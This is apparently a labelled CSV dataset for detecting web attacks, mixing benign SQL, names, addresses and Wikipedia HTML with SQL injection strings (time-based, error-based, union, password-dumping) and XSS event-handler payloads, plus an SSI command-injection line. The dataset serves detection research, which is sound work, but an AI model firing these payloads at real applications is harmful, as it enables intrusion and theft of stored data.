Text,Label,type
"<a href=""/wiki/Dartmouth_Workshop"" class=""mw-redirect"" title=""Dartmouth Workshop"">Dartmouth conference </a>:",0,xss
SELECT TOP 3 * FROM complex,0,sql
healy,0,sql
<address onpointerout=alert(1)>XSS</address>,2,xss
"<style>:target {transform: rotate(180deg);}</style><td id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></td>",2,xss
"1""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
"<label onmouseover=""alert(1)"">test</label>",2,xss
stella mara,0,sql
-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,sql
"<bdo onbeforecut=""alert(1)"" contenteditable>test</bdo>",2,xss
<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>,2,xss
<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>,2,xss
"<menu onbeforepaste=""alert(1)"" contenteditable>test</menu>",2,xss
"<font onkeyup=""alert(1)"" contenteditable>test</font>",2,xss
-3125'   )    )     )   order by 1#,1,sql
 ,0,xss
"pi y margall 17, 7?f",0,sql
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,sql
"   SELECT Employees.eat, COUNT ( Orders.fairlyID )  AS interiorFROM    ( OrdersINNER JOIN imagine ON Orders.fearID  =  Employees.thingID ) ",0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
nolen@enmenorca.com.th,0,sql
SELECT consonant FROM numeral UNION ALL SELECT least FROM particular ORDER BY funny,0,sql
"INSERT INTO naturally ( stretch, foreign, found, beside, experience, push )  VALUES  ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )  ",0,sql
overman@saavedradiaz.travel,0,sql
28660,0,sql
teruyuki,0,xss
"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",2,xss
SELECT * FROM with WHERE loose = 'have' FETCH FIRST 3 ROWS ONLY,0,sql
<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>,2,xss
"	<div class=""mw-indicators mw-body-content"">",0,xss
rocco-misaki@soybueno.nz,0,sql
"<details onmouseenter=""alert(1)"">test</details>",2,xss
	 </span> 2018 ,0,xss
"  SELECT leg,group,travel FROM shelter LEFT JOIN Orders ON chest.solidID =  could.frozen ORDER BY fear.so",0,sql
"<object onclick=""alert(1)"">test</object>",2,xss
"1""  )   as duvm where 6190  =  6190 order by 1--",1,sql
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable>drop here</fieldset>",2,xss
"<style>:target {transform: rotate(180deg);}</style><data id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></data>",2,xss
<body ontouchstart=alert(1)> ,2,xss
"1%""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,1,sql
coripe,0,sql
"<div onbeforecopy=""alert(1)"" contenteditable>test</div>",2,xss
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",1,sql
"<var onclick=""alert(1)"">test</var>",2,xss
SELECT * FROM chosen WHERE importance = 'nest' LIMIT 3,0,sql
SELECT * FROM car WHERE answer IN  ( SELECT vapor FROM twelve ) ,0,sql
1 where 4787  =  4787,1,sql
"<hr draggable=""true"" ondragstart=""alert(1)"">test</hr>",2,xss
SELECT enemy ( s )  FROM five SELECT wrong FROM wind,0,xss
SELECT TOP 3 * FROM aloud SELECT * FROM invented 3SELECT * FROM visitor,0,sql
SELECT * FROM potatoes WHERE simplest = 'felt'  AND  ( alphabet = 'skin' OR group = 'pilot' ) ,0,xss
1  )   where 1013  =  1013 and 5573  =  9445#,1,sql
"  UPDATE broad SET moving =  'spin', City =  'mixture' WHERE corn =  which",0,sql
<param onpointermove=alert(1)>XSS</param>,2,xss
"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""zgoy"" like ""zgoy",1,sql
SELECT * FROM factory WHERE team = 'should',0,xss
	 </span>,0,xss
jehovah,0,sql
f8av2,0,sql
"1""   )    )     )   union all select null,null,null,null,null,null,null--",1,sql
7e2hered0962n,0,sql
SELECT * FROM floating WHERE floating = 'himself' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT COUNT ( DISTINCT hold )  FROM organization,0,sql
SELECT hall FROM hour,0,sql
 (  select   (  case when   (  6035  =  9882  )   then 6035 else 6035*  (  select 6035 from mysql.db  )   end   )    ) ,1,sql
1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,1,sql
1'||  (  select 'lkmh' where 7659  =  7659,1,sql
78595518x,0,sql
SELECT day ( s )  FROM exchange,0,sql
SELECT MIN ( around )  AS major FROM found,0,sql
"<li><a href=""/wiki/Qian_Xuesen"" title=""Qian Xuesen"">Qian Xuesen </a> </li>",0,xss
"<bdo draggable=""true"" ondragend=""alert(1)"">test</bdo>",2,xss
"-4592""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""xvpz""  =  ""xvpz",1,sql
kinsman,0,sql
"<style>:target {transform: rotate(180deg);}</style><cite id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></cite>",2,xss
"<p>Much of traditional <a href=""/wiki/Symbolic_artificial_intelligence"" title=""Symbolic artificial intelligence"">GOFAI </a> got bogged down on <i>ad hoc </i> patches to <a href=""/wiki/Symbolic_computation"" class=""mw-redirect"" title=""Symbolic computation"">symbolic computation </a> that worked on their own toy models but failed to generalize to real-world results. However, around the 1990s, AI researchers adopted sophisticated mathematical tools, such as <a href=""/wiki/Hidden_Markov_model"" title=""Hidden Markov model"">hidden Markov models </a> (HMM), <a href=""/wiki/Information_theory"" title=""Information theory"">information theory </a>, and normative Bayesian <a href=""/wiki/Decision_theory"" title=""Decision theory"">decision theory </a> to compare or to unify competing architectures. The shared mathematical language permitted a high level of collaboration with more established fields (like <a href=""/wiki/Mathematics"" title=""Mathematics"">mathematics </a>, economics or <a href=""/wiki/Operations_research"" title=""Operations research"">operations research </a>).<sup id=""cite_ref-174"" class=""reference""><a href=""#cite_note-174"">&#91;d&#93; </a> </sup> Compared with GOFAI, new ""statistical learning"" techniques such as HMM and neural networks were gaining higher levels of accuracy in many practical domains such as <a href=""/wiki/Data_mining"" title=""Data mining"">data mining </a>, without necessarily acquiring a semantic understanding of the datasets. The increased successes with real-world data led to increasing emphasis on comparing different approaches against shared test data to see which approach performed best in a broader context than that provided by idiosyncratic toy models; AI research was becoming more <a href=""/wiki/Scientific_method"" title=""Scientific method"">scientific </a>. Nowadays results of experiments are often rigorously measurable, and are sometimes (with difficulty) reproducible.<sup id=""cite_ref-Formal_methods_in_AI_43-1"" class=""reference""><a href=""#cite_note-Formal_methods_in_AI-43"">&#91;43&#93; </a> </sup><sup id=""cite_ref-175"" class=""reference""><a href=""#cite_note-175"">&#91;171&#93; </a> </sup> Different statistical learning techniques have different limitations; for example, basic HMM cannot model the infinite possible combinations of natural language.<sup id=""cite_ref-FOOTNOTENorvig2012_176-0"" class=""reference""><a href=""#cite_note-FOOTNOTENorvig2012-176"">&#91;172&#93; </a> </sup> Critics note that the shift from GOFAI to statistical learning is often also a shift away from <a href=""/wiki/Explainable_AI"" class=""mw-redirect"" title=""Explainable AI"">explainable AI </a>. In AGI research, some scholars caution against over-reliance on statistical learning, and argue that continuing research into GOFAI will still be necessary to attain general intelligence.<sup id=""cite_ref-FOOTNOTELangley2011_177-0"" class=""reference""><a href=""#cite_note-FOOTNOTELangley2011-177"">&#91;173&#93; </a> </sup><sup id=""cite_ref-FOOTNOTEKatz2012_178-0"" class=""reference""><a href=""#cite_note-FOOTNOTEKatz2012-178"">&#91;174&#93; </a> </sup>",0,xss
-7345  )   union all select 3866#,1,sql
"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",2,xss
SELECT scientist ( s )  FROM shop SELECT author ( s ) ,0,sql
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,sql
ductilidad,0,sql
"<ul><li><a href=""/wiki/Timeline_of_artificial_intelligence"" title=""Timeline of artificial intelligence"">Timeline </a> </li>",0,xss
SELECT * FROM birthday WHERE all = 'party' LIMIT 3,0,sql
 </p>,0,xss
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,sql
"<li><i><a href=""/wiki/Index_of_philosophy_of_mind_articles"" title=""Index of philosophy of mind articles"">more... </a> </i> </li> </ul>",0,xss
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,xss
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xgzb'  =  'xgzb",1,sql
"cuerlas, las",0,sql
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb",1,sql
"1'+  (  select eztr where 4260  =  4260 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",1,sql
"<li><a href=""/wiki/Nano-RAM"" title=""Nano-RAM"">NRAM </a> </li>",0,xss
"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",1,sql
SELECT MIN ( evening )  AS future FROM primitive,0,xss
"  UPDATE species SET frog =  'safe', City =  'movie' WHERE flower =  scientist",0,sql
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'jmub'  =  'jmub",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Simon, Matt (1 April 2019). <a rel=""nofollow"" class=""external text"" href=""https://www.wired.com/story/andrew-yangs-presidential-bid-is-so-very-21st-century/"">""Andrew Yang's Presidential Bid Is So Very 21st Century"" </a>. <i>Wired </i> &#8211; via www.wired.com. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired&amp;rft.atitle=Andrew+Yang%27s+Presidential+Bid+Is+So+Very+21st+Century&amp;rft.date=2019-04-01&amp;rft.aulast=Simon&amp;rft.aufirst=Matt&amp;rft_id=https%3A%2F%2Fwww.wired.com%2Fstory%2Fandrew-yangs-presidential-bid-is-so-very-21st-century%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
1  )   where 4573  =  4573,1,sql
SELECT TOP 3 * FROM tropical SELECT * FROM feel 3SELECT * FROM chair,0,sql
"pl. lugo 187,",0,xss
"<li><a href=""/wiki/Philosophy_of_geography"" title=""Philosophy of geography"">Geography </a> </li>",0,xss
"<li><a href=""/wiki/Observation"" title=""Observation"">Observation </a> </li>",0,xss
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'zcrh'  =  'zcrh",1,sql
"<command oncut=""alert(1)"" contenteditable>test</command>",2,xss
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""jgcv""  =  ""jgcv",1,sql
SELECT column_name FROM table1 UNION,0,sql
9.32767E+15,0,sql
"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'aiuy'  =  'aiuy",1,sql
"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></em>",2,xss
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationend=""alert(1)""></tt>",2,xss
SELECT * FROM wait,0,sql
"	 <div class=""magnify""><a href=""/wiki/File:D%C3%A9tection_de_personne_-_exemple_3.jpg"" class=""internal"" title=""Enlarge""> </a> </div>A self-driving car system may use a neural network to determine which parts of the picture seem to match previous training images of pedestrians, and then model those areas as slow-moving but somewhat unpredictable rectangular prisms that must be avoided.<sup id=""cite_ref-79"" class=""reference""><a href=""#cite_note-79"">&#91;76&#93; </a> </sup><sup id=""cite_ref-80"" class=""reference""><a href=""#cite_note-80"">&#91;77&#93; </a> </sup> </div> </div> </div>",0,xss
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",1,sql
lizalde-kikabidze@sorority.zr,0,sql
"<li>Ask or search questions in <a class=""reference external"" href=""https://stackoverflow.com/tags/scrapy"">StackOverflow using the scrapy tag</a>.</li>",0,xss
"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
1' and sleep  (  5  )   and 'usgv' like 'usgv,1,sql
; begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >,1,xss
"   SELECT behind, excitement, cardFROM exact WHERE disease  IS NOT NULL",0,xss
"pasaje lucero 147,",0,sql
argujillo,0,sql
SELECT * FROM lesson WHERE return NOT BETWEEN 'bright' AND 'beginning',0,sql
"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",1,sql
<nobr onpointerout=alert(1)>XSS</nobr>,2,xss
wilson@autoconstruccion.fi,0,sql
<li id=x tabindex=1 onbeforeactivate=alert(1)></li>,2,xss
<pre id=x tabindex=1 onfocusin=alert(1)></pre>,2,xss
9ei91n,0,sql
SELECT * FROM kids WHERE avoid BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""-->",2,xss
"<dialog draggable=""true"" ondragleave=""alert(1)"">test</dialog>",2,xss
"<SCRIPT DEFER>alert("""")</SCRIPT>",2,xss
riego,0,sql
"   SELECT salmon, winter+ ', ' + strange+ ' ' + poor+ ', ' + stronger AS board  FROM exact",0,sql
"<base draggable=""true"" ondragstart=""alert(1)"">test</base>",2,xss
7stambrar,0,sql
"<multicol draggable=""true"" ondrag=""alert(1)"">test</multicol>",2,xss
SELECT * FROM bad WHERE baby BETWEEN row09/01/1996moving AND mood15/31/1996development,0,sql
garek,0,sql
-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',1,sql
SELECT COUNT ( DISTINCT danger )  FROM fallen,0,sql
1' where 4795  =  4795 and 4595  =  4595#,1,sql
chinarro,0,sql
"<li><a href=""/wiki/Tabula_rasa"" title=""Tabula rasa"">Tabula rasa </a> </li>",0,xss
"-4031%"" union all select 9566--",1,sql
1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,1,sql
alar1ado0,0,sql
10380,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Goertzel, Ben; Lian, Ruiting; Arel, Itamar; de Garis, Hugo; Chen, Shuo (December 2010). ""A world survey of artificial brain projects, Part II: Biologically inspired cognitive architectures"". <i>Neurocomputing </i>. <b>74 </b> (1–3): 30–49. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.neucom.2010.08.012"">10.1016/j.neucom.2010.08.012 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Neurocomputing&amp;rft.atitle=A+world+survey+of+artificial+brain+projects%2C+Part+II%3A+Biologically+inspired+cognitive+architectures&amp;rft.volume=74&amp;rft.issue=1%E2%80%933&amp;rft.pages=30-49&amp;rft.date=2010-12&amp;rft_id=info%3Adoi%2F10.1016%2Fj.neucom.2010.08.012&amp;rft.aulast=Goertzel&amp;rft.aufirst=Ben&amp;rft.au=Lian%2C+Ruiting&amp;rft.au=Arel%2C+Itamar&amp;rft.au=de+Garis%2C+Hugo&amp;rft.au=Chen%2C+Shuo&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
	 </span>	 ,0,xss
" SELECT * FROM gravity ORDER BY arrive, strange",0,sql
calle constanti s/n 5?h,0,sql
"1"" and 4288  =  3696 and ""qqam"" like ""qqam",1,sql
SELECT * FROM clothing WHERE prove = 'east',0,sql
"-8331'  )   union all select 1452,1452,1452,1452,1452--",1,sql
"<strong ondblclick=""alert(1)"">test</strong>",2,xss
SELECT AVG ( hardly ) FROM by,0,xss
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1,sql
<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,2,xss
torre-cardela,0,sql
6.2103E+15,0,sql
SELECT automobile ( s )  FROM while LEFT JOIN,0,xss
SELECT cover FROM building,0,sql
"<IMG SRC='vbscript:msgbox("""")'>",2,xss
1' where 5458  =  5458 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sql
"<li><a href=""/wiki/Bees_algorithm"" title=""Bees algorithm"">Bees algorithm </a> </li>",0,xss
SELECT * FROM your WHERE river = 'cast'  OR beyond = 'solid',0,xss
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN  ( 'our-family-template' )  AND  (  0  =  1  )  AND wp_posts.post_type  =  'wp_template' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,0,sql
